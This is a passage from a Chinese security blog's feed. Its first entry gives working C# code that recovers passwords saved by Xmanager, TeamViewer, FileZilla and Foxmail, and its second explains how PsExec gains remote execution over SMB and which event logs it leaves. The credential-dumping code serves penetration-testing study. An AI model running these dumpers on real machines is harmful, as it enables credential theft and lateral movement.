class="line"><span class="keyword">byte</span>[] data = Convert.FromBase64String(rawPass);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] Key = <span class="keyword">new</span> SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(UserSid));</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] passData = <span class="keyword">new</span> <span class="keyword">byte</span>[data.Length - <span class="number">0x20</span>];</span><br><span class="line">Array.Copy(data, <span class="number">0</span>, passData, <span class="number">0</span>, data.Length - <span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">byte</span>[] decrypted = RC4Crypt.Decrypt(Key, passData);</span><br><span class="line"></span><br><span class="line">Console.WriteLine(<span class="string">"Decrypt: &#123;0&#125;"</span>, Encoding.ASCII.GetString(decrypted));</span><br><span class="line"></span><br><span class="line"> ==》 Decrypt: root</span><br></pre></td></tr></table></figure></li></ul><p><strong>结果如下所示：</strong></p><p><img src="/image/SharpDecryptPwd/blog_2019-08-23_09-32-36.png" alt=""></p><center> Xmanager 解密结果</center><p>以上所有测试均为工作组环境，因为在域环境解密失败，原因未知。</p><h2 id="0x04-TeamView"><a href="#0x04-TeamView" class="headerlink" title="0x04 TeamView"></a>0x04 TeamView</h2><p>直接是通过获取<code>TeamView</code> 的句柄，把窗体上所有控件的变量给读出来。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">EnumFunc</span>(<span class="params">IntPtr hWnd, IntPtr lParam</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder(<span class="number">256</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> WM_GETTEXT = <span class="number">0x0D</span>;</span><br><span class="line">    GetClassNameW(hWnd, sb, sb.Capacity);</span><br><span class="line">    <span class="keyword">if</span> (sb.ToString() == <span class="string">"Edit"</span> || sb.ToString() == <span class="string">"Static"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        WindowInfo wnd = <span class="keyword">new</span> WindowInfo();</span><br><span class="line">        wnd.hWnd = hWnd;</span><br><span class="line">        wnd.szClassName = sb.ToString();</span><br><span class="line">        <span class="keyword">if</span> (wnd.szClassName == <span class="string">"Edit"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder(<span class="number">256</span>);</span><br><span class="line">            SendMessage(hWnd, WM_GETTEXT, <span class="number">256</span>, stringBuilder);</span><br><span class="line">            wnd.szWindowName = stringBuilder.ToString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            GetWindowTextW(hWnd, sb, sb.Capacity);</span><br><span class="line">            wnd.szWindowName = sb.ToString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Console.WriteLine("句柄=" + wnd.hWnd.ToString().PadRight(20) + " 类型=" + wnd.szClassName.PadRight(20) + " 名称=" + wnd.szWindowName);</span></span><br><span class="line">        <span class="comment">//add it into list</span></span><br><span class="line">        wndList.Add(wnd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        为了其兼容性，不对结果进行筛选，输出全部窗体内容信息</p><p><img src="/image/SharpDecryptPwd/blog_2019-08-23_14-40-13.png" alt=""></p><center> TeamView 解密结果</center><h2 id="0x05-FileZilla"><a href="#0x05-FileZilla" class="headerlink" title="0x05 FileZilla"></a>0x05 FileZilla</h2><p>​        从网上收集的信息得到：</p><ul><li>在 <code>Filezilla 2.X</code> 版本中，密码正在进行异或处理并存储在 Registry 中;</li><li>在 <code>Filezilla 3.x</code> 版本中，密码以明文形式存储在 <code>.xml文件</code>中。</li></ul><p>如今官方的最新版本为 <code>FileZilla_3.44.2_win64_sponsored-setup</code>，以此版本进行测试：</p><p><img src="/image/SharpDecryptPwd/blog_2019-08-26_09-47-20.png" alt=""></p><p>直接读取 相关xml 的内容即可（<strong><em>recentservers.xml</em></strong>）</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">fileZilla</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">string</span> FzPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), <span class="string">@"FileZilla\recentservers.xml"</span>);</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(FzPath))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> objXmlDocument = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">objXmlDocument.Load(FzPath);</span><br><span class="line">Console.WriteLine(<span class="string">"&#123;0,-20&#125;&#123;1,-8&#125;&#123;2,-15&#125;&#123;3,-15&#125;"</span>, <span class="string">"Host"</span>, <span class="string">"Port"</span>, <span class="string">"Username"</span>, <span class="string">"ratPass"</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="function">XmlElement XE <span class="title">in</span> (<span class="params">(XmlElement</span>)objXmlDocument.<span class="title">GetElementsByTagName</span>(<span class="params"><span class="string">"RecentServers"</span></span>)[0]).<span class="title">GetElementsByTagName</span>(<span class="params"><span class="string">"Server"</span></span>))</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> Host = XE.GetElementsByTagName(<span class="string">"Host"</span>)[<span class="number">0</span>].InnerText;</span><br><span class="line"><span class="keyword">var</span> Port = XE.GetElementsByTagName(<span class="string">"Port"</span>)[<span class="number">0</span>].InnerText;</span><br><span class="line"><span class="keyword">var</span> User = XE.GetElementsByTagName(<span class="string">"User"</span>)[<span class="number">0</span>].InnerText;</span><br><span class="line"><span class="keyword">var</span> Pass = (Encoding.UTF8.GetString(Convert.FromBase64String(XE.GetElementsByTagName(<span class="string">"Pass"</span>)[<span class="number">0</span>].InnerText)));</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">string</span>.IsNullOrEmpty(Host) &amp;&amp; !<span class="keyword">string</span>.IsNullOrEmpty(Port) &amp;&amp; !<span class="keyword">string</span>.IsNullOrEmpty(User) &amp;&amp; !<span class="keyword">string</span>.IsNullOrEmpty(Pass))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">"&#123;0,-20&#125;&#123;1,-8&#125;&#123;2,-15&#125;&#123;3,-15&#125;"</span>, Host, Port, User, Pass);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>效果如下：</strong><br><img src="/image/SharpDecryptPwd/blog_2019-08-26_10-17-43.png" alt=""></p><center> FileZilla 解密结果</center><h2 id="0x06-Foxmail"><a href="#0x06-Foxmail" class="headerlink" title="0x06 Foxmail"></a>0x06 Foxmail</h2><p><code>Foxmail</code> 将输入的密码和一个固定字符串做异或加密，然后在前面添加字符串 <code>Password</code> ，用于标记作用。</p><table><tr><th width="20%" bgcolor="#eea236">版本号 </th><th width="40%" bgcolor="#eea236">存储文件 </th><th width="40%" style="text-align:center" bgcolor="rgb(92," 184,="" 92)="">固定异或字符串(加密密钥)</th></tr><tr><td> Version 6.X </td><td> Account.stg -v6.5</td><td> ~draGon~  第一位异或值：5A</td></tr><tr><td> Version 7.X </td><td> Accounts.tdat -v7.0 Account.rec0 -v7.1</td><td> ~F@7％m$~  第一位异或值：71</td></tr></table><p>至于为什么是这个值，可以直接逆向查看，或者看看这篇文章 <a href="https://wenku.baidu.com/view/1fcaf49cda38376baf1faeff" target="_blank" rel="noopener">foxmail 邮箱密码密码原理和方法研究</a>。</p><p><strong>Foxmail Version 6.x 加密方法：</strong> </p><ul><li><p>将原密文的第一位 16进制与 <code>5A</code> 进行 <code>XOR异或</code> 操作，然后替换掉原密文的第一位后，得到一个新密文</p>  <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>A 的由来</span><br><span class="line"><span class="keyword">string</span> key = <span class="string">"~draGon~"</span>;</span><br><span class="line"><span class="keyword">byte</span>[] data = Encoding.Default.GetBytes(key);</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">x += <span class="keyword">int</span>.Parse(data[i].ToString());</span><br><span class="line">&#125;</span><br><span class="line">x %= <span class="number">255</span>;</span><br><span class="line">Console.WriteLine(x); <span class="comment">// 90 =&gt; 5A</span></span><br></pre></td></tr></table></figure></li><li><p>再将新密文从第二位开始分别与密钥 <code>~draGon~</code>（7E647261476F6E7E）进行 <code>XOR异或</code>，并将此时得到的密文与原密文进行相减，得到明文的 16进制。</p></li><li><code>Account.stg</code>  文件使用二进制格式存储并在前 <code>0x800 字节</code>内填充了一些十六进制数据，之后才是真正的账户信息，包括 POP3 和 SMTP 账户、密码。</li><li>POP3 和 SMTP 账户密码分别用 “POP3Password” 和 “ESMTPPassword” 来代表。密码使用十六进制格式并用 XOR 异或加密，密钥为“~draGon~”。</li></ul><p><strong>版本 7.X 同理。</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> Foxmail password decoder</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> Credit: Jacob Soo</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://github.com/jacobsoo/FoxmailRecovery/blob/c3263424dd961ec23868d03c9caad13fa5c017ee/Foxmail%20Password%20Recovery/Foxmail%20Password%20Recovery/SharedFunctions.cs#L72</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> https://github.com/lim42snec/foxmaildump/blob/ca29edc6d767b4e52ee939cdad1d0f8cd7c9f626/FoxmailDump.cpp#L34</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="ver"&gt;</span>版本号<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name="pHash"&gt;</span>密文<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span><span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decodePW</span>(<span class="params"><span class="keyword">int</span> ver, String strHash</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">String decodedPW = <span class="string">""</span>;</span><br><span class="line"><span class="comment">// 第一步：定义不同版本的秘钥</span></span><br><span class="line"><span class="keyword">int</span>[] a;</span><br><span class="line"><span class="comment">// fc0 的值是根据版本密钥，以字节为单位将16进制密文转成10进制，十进制之和求余。（x %=255;）</span></span><br><span class="line"><span class="keyword">int</span> fc0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ver == <span class="number">0</span>) <span class="comment">// Version 6</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span>[] v6a = &#123; <span class="string">'~'</span>, <span class="string">'d'</span>, <span class="string">'r'</span>, <span class="string">'a'</span>, <span class="string">'G'</span>, <span class="string">'o'</span>, <span class="string">'n'</span>, <span class="string">'~'</span> &#125;;</span><br><span class="line">a = v6a;</span><br><span class="line">fc0 = Convert.ToInt32(<span class="string">"5A"</span>, <span class="number">16</span>); <span class="comment">//90</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">// Version 7</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span>[] v7a = &#123; <span class="string">'~'</span>, <span class="string">'F'</span>, <span class="string">'@'</span>, <span class="string">'7'</span>, <span class="string">'%'</span>, <span class="string">'m'</span>, <span class="string">'$'</span>, <span class="string">'~'</span> &#125;;</span><br><span class="line">a = v7a;</span><br><span class="line">fc0 = Convert.ToInt32(<span class="string">"71"</span>, <span class="number">16</span>); <span class="comment">// 113</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二步：以字节为单位将16进制密文转成10进制</span></span><br><span class="line"><span class="keyword">int</span> size = strHash.Length / <span class="number">2</span>; </span><br><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span>[] b = <span class="keyword">new</span> <span class="keyword">int</span>[size];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">b[i] = Convert.ToInt32(strHash.Substring(index, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line">index = index + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三步：将第一个元素替换成与指定数异或后的结果</span></span><br><span class="line"><span class="keyword">int</span>[] c = <span class="keyword">new</span> <span class="keyword">int</span>[b.Length];</span><br><span class="line"></span><br><span class="line">c[<span class="number">0</span>] = b[<span class="number">0</span>] ^ fc0;</span><br><span class="line"></span><br><span class="line">Array.Copy(b, <span class="number">1</span>, c, <span class="number">1</span>, b.Length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第四步：不断扩容拷贝自身</span></span><br><span class="line"><span class="keyword">while</span> (b.Length &gt; a.Length)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span>[] newA = <span class="keyword">new</span> <span class="keyword">int</span>[a.Length * <span class="number">2</span>];</span><br><span class="line">Array.Copy(a, <span class="number">0</span>, newA, <span class="number">0</span>, a.Length);</span><br><span class="line">Array.Copy(a, <span class="number">0</span>, newA, a.Length, a.Length);</span><br><span class="line">a = newA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>[] d = <span class="keyword">new</span> <span class="keyword">int</span>[b.Length];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; b.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">d[i - <span class="number">1</span>] = b[i] ^ a[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>[] e = <span class="keyword">new</span> <span class="keyword">int</span>[d.Length];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; d.Length - <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (d[i] - c[i] &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">e[i] = d[i] + <span class="number">255</span> - c[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">e[i] = d[i] - c[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">decodedPW += (<span class="keyword">char</span>)e[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> decodedPW;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到目前为止，此版本支持 6.5 至 7.2 版的数据恢复，但是这里只是测试了 7.2版本，效果如下</p><p><img src="/image/SharpDecryptPwd/blog_2019-10-11_17-49-10.png" alt=""></p><center> Foxmail 解密结果</center><h2 id="来源参考"><a href="#来源参考" class="headerlink" title="来源参考"></a>来源参考</h2><p><a href="https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password" target="_blank" rel="noopener">https://github.com/DoubleLabyrinth/how-does-navicat-encrypt-password</a><br><a href="http://www.zcgonvh.com/post/SQL_Server_Management_Studio_saved_password_dumper.html" target="_blank" rel="noopener">SQL Server Management Studio密码导出工具</a><br><a href="https://github.com/zcgonvh/SSMSPwd" target="_blank" rel="noopener">https://github.com/zcgonvh/SSMSPwd</a><br><a href="https://github.com/DoubleLabyrinth/how-does-Xmanager-encrypt-password" target="_blank" rel="noopener">https://github.com/DoubleLabyrinth/how-does-Xmanager-encrypt-password</a><br><a href="https://cloud.tencent.com/developer/news/261135" target="_blank" rel="noopener">https://cloud.tencent.com/developer/news/261135</a><br><a href="https://www.t00ls.net/viewthread.php?tid=51996&amp;extra=&amp;highlight=teamview&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=51996&amp;extra=&amp;highlight=teamview&amp;page=1</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一篇对密码已保存在 Windwos 系统上的部分程序进行解析。&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>深入了解 PsExec [知识回顾]</title>
    <link href="https://rcoil.me/2019/08/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/"/>
    <id>https://rcoil.me/2019/08/深入了解 PsExec/</id>
    <published>2019-08-08T06:37:56.000Z</published>
    <updated>2019-08-09T02:38:53.963Z</updated>
    
    <content type="html"><![CDATA[<p>这个<strong>[ 知识回顾 ]</strong>系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；</p><a id="more"></a><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这篇文章将解释 <code>PsExec</code> 的使用条件、原理及背景知识。但不包括 <code>PsExec</code> 在通信时主要用到了 <code>SMB</code> 这个应用层协议（ <code>SMB</code>协商过程），想了解的请看 参考-1-2。</p><h2 id="0x01-什么是-PsExec"><a href="#0x01-什么是-PsExec" class="headerlink" title="0x01 什么是 PsExec"></a>0x01 什么是 <code>PsExec</code></h2><p><code>PsExec</code> 是由 <code>Mark Russinovich</code> 创建的 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" target="_blank" rel="noopener">Sysinternals Suite</a> 中包含的工具。最初，它旨在作为系统管理员的便利工具，以便他们可以通过在远程主机上运行命令来执行维护任务。<code>PsExec</code> 可以算是一个轻量级的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与命令控制台几乎相同的实时交互性。PsExec最强大的功能就是在远程系统和远程支持工具（如 ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。</p><h2 id="0x02-工作原理"><a href="#0x02-工作原理" class="headerlink" title="0x02 工作原理"></a>0x02 工作原理</h2><p>通过提供目标主机的地址，有效用户和密码，就可以远程控制计算机。</p><p><img src="/image/深入了解 PsExec/Snipaste_2019-08-08_10-45-55.png" alt=""></p><p>它的背后到底发生了些什么，我们来看看：</p><ul><li>将 <code>PSEXESVC.exe</code> 上传到 <code>ADMIN$</code> （指向 <code>/admin$/system32/PSEXESVC.EXE</code>）共享文件夹内；</li><li>远程创建用于运行 <code>PSEXESVC.exe</code> 的服务；</li><li>远程启动服务。</li></ul><p><code>PSEXESVC</code> 服务充当一个重定向器（包装器）。它在远程系统上运行指定的可执行文件（事例中的是 <code>cmd.exe</code>）。同时，它通过主机之间来重定向进程的输入/输出（利用命名管道）。</p><p><img src="/image/深入了解 PsExec/blog_2019-08-09_09-39-29.png" alt=""></p><h2 id="0x03-详细过程"><a href="#0x03-详细过程" class="headerlink" title="0x03 详细过程"></a>0x03 详细过程</h2><ul><li>使用提供的凭证，通过 <code>SMB 会话</code> 进行身份验证。</li><li>通过 <code>SMB</code> 访问默认共享文件夹 <code>ADMIN$</code>，并上载 <code>PSEXESVC.exe</code>；</li><li><p><img src="/image/深入了解 PsExec/Snipaste_2019-08-08_15-14-16.png" alt=""></p></li><li><p>打开 <code>\\RDC\pipe\svcctl</code> 的句柄，与<code>服务控制管理器（SCM）</code>进行通信，这使得我们能够远程创建/启动服务。此时使用的是 <code>SVCCTL</code> 服务，通过对 <code>SVCCTL服务</code> 的 <code>DCE/RPC</code> 调用来启动 <code>PsExec</code>;</p></li><li>使用上传的 <code>PSEXESVC.exe</code> 作为服务二进制文件，调用 <code>CreateService 函数</code>；</li><li>调用 <code>StartServices 函数</code>；</li><li><img src="/image/深入了解 PsExec/Snipaste_2019-08-08_15-25-29.png" alt=""></li><li><p><img src="/image/深入了解 PsExec/Snipaste_2019-08-08_15-28-25.png" alt=""></p></li><li><p>正如下面的 <code>Wireshark</code> 所捕获到的数据，它是创建了命名管道来重定向 stdin（输入）、stdout（输出）、stderr（输出）。</p></li><li><img src="/image/深入了解 PsExec/Snipaste_2019-08-08_15-33-49.png" alt=""></li></ul><p>总共创建了4个命名管道，一个用于服务本身，另外的管道用于重定向进程的 stdin、stdout、stderr。</p><p><img src="/image/深入了解 PsExec/Snipaste_2019-08-08_15-47-34.png" alt=""></p><h2 id="0x04-使用-PsExec-的最低要求"><a href="#0x04-使用-PsExec-的最低要求" class="headerlink" title="0x04 使用 PsExec 的最低要求"></a>0x04 使用 PsExec 的最低要求</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、远程机器的 <span class="number">139</span> 或 <span class="number">445</span> 端口需要开启状态，即 SMB；</span><br><span class="line"><span class="number">2</span>、明文密码或者 NTLM 哈希；</span><br><span class="line"><span class="number">3</span>、具备将文件写入共享文件夹的权限；</span><br><span class="line"><span class="number">4</span>、能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：<span class="number">0x0002</span>)；</span><br><span class="line"><span class="number">5</span>、能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：<span class="number">0x0004</span>）+ SERVICE_START（访问掩码：<span class="number">0x0010</span>）</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NTLM != NTLM v1/v2 ；</span><br><span class="line">NTFS 权限 != 共享权限；</span><br><span class="line">如果使用的是 Sysinternal 的 PsExec，它是会将 PSEXESVC.exe 复制到 ADMIN$，因此是具备访问它的权限；</span><br><span class="line">PSEXESVC 服务将会安装在远程系统中，此时将会生成 Event <span class="number">4697</span>、<span class="number">7045</span> 这<span class="number">2</span>种事件日志；</span><br><span class="line">PsExec <span class="number">2.1</span>版本之后，不再是明文传输。</span><br></pre></td></tr></table></figure><p>在多数情况下，即使账号出现泄漏情况，使用 <code>PsExec</code>， 也无法完成第4和第5点的要求，因为账号不是特权账号（RID500、域管理员）。</p><h2 id="0x05-其他"><a href="#0x05-其他" class="headerlink" title="0x05 其他"></a>0x05 其他</h2><p>日志分析：略</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p>1、<a href="https://bbs.pediy.com/thread-223721.htm" target="_blank" rel="noopener">[翻译] 网络安全分析之 SMB 协议</a><br>2、<a href="http://zone.secbug.net/content/2230.html" target="_blank" rel="noopener">[使用Hash直接登录Windows]简单分析</a><br>3、<a href="https://www.anquanke.com/post/id/84921" target="_blank" rel="noopener">[技术分享] 深入分析PsExec执行行为</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个&lt;strong&gt;[ 知识回顾 ]&lt;/strong&gt;系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】 SPN 扫描利用</title>
    <link href="https://rcoil.me/2019/06/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%20SPN%20%E6%89%AB%E6%8F%8F%E5%88%A9%E7%94%A8/"/>
    <id>https://rcoil.me/2019/06/【域渗透】 SPN 扫描利用/</id>
    <published>2019-06-10T10:52:59.000Z</published>
    <updated>2019-10-11T03:19:30.941Z</updated>
    
